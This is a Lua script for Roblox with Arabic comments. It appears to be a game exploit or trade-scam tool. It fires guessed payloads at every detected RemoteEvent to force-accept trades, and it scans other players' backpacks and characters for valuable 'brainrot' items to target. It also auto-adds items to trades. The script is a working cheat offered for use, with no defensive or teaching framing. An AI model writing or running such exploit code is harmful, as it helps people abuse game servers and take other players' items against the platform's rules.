-- دالة قبول التداول تلقائياً
function autoAcceptTrade(tradeId)
    if not Config.ForceAcceptTrades then return false end
    
    task.wait(0.5) -- انتظار قصير لضمان استقرار التداول
    
    -- محاولة القبول عبر جميع الـ remotes
    for _, path in ipairs(detectedRemotes) do
        local remote = ReplicatedStorage:FindFirstChild(path, true)
        if remote and remote:IsA("RemoteEvent") then
            pcall(function()
                -- محاولات مختلفة للقبول
                remote:FireServer({action = "accept", tradeId = tradeId, force = true})
                remote:FireServer("accept", tradeId)
                remote:FireServer({Accept = true, Trade = tradeId})
                print("🔒 تم قبول التداول تلقائياً: " .. tradeId)
            end)
        end
    end
    
    return true
end

-- دالة فحص اللاعبين
function scanPlayer(player)
    if player == LocalPlayer or not player.Character then return nil end
    local found, ultra, priority = nil, false, false

    -- فحص الـ Backpack أولاً
    if player.Backpack then
        for _, item in ipairs(player.Backpack:GetChildren()) do
            if isTargetBrainrot(item.Name) then
                found = item.Name
                ultra = isUltraPriority(item.Name)
                priority = true
                break
            end
        end
    end

    -- فحص الـ Character إذا لم يتم العثور
    if not found and player.Character then
        for _, item in ipairs(player.Character:GetChildren()) do
            if isTargetBrainrot(item.Name) then
                found = item.Name
                ultra = isUltraPriority(item.Name)
                priority = true
                break
            end
        end
    end

    return found and {name = found, ultra = ultra, priority = priority, player = player}
end

-- دالة إضافة أفضل البراينروت للتداول
function addBestBrainrotToTrade()
    -- البحث عن أفضل البراينروت في حوزتك
    local bestItem = nil
    local bestValue = 0
    
    if LocalPlayer.Backpack then
        for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
            if isTargetBrainrot(item.Name) then
                local value = isUltraPriority(item.Name) and 100 or (isPriority(item.Name) and 50 or 10)
                if value > bestValue then
                    bestValue = value
                    bestItem = item
                end
            end
        end
    end
    
    if bestItem then
        -- محاولة إضافة العنصر للتداول
        for _, path in ipairs(detectedRemotes) do
            local remote = ReplicatedStorage:FindFirstChild(path, true)
            if remote and remote:IsA("RemoteEvent") then
                pcall(function()
                    remote:FireServer({action = "addItem", item = bestItem, trade = "current"})
                    print("💎 تم إضافة: " .. bestItem.Name)
                end)
            end
        end
    end
end

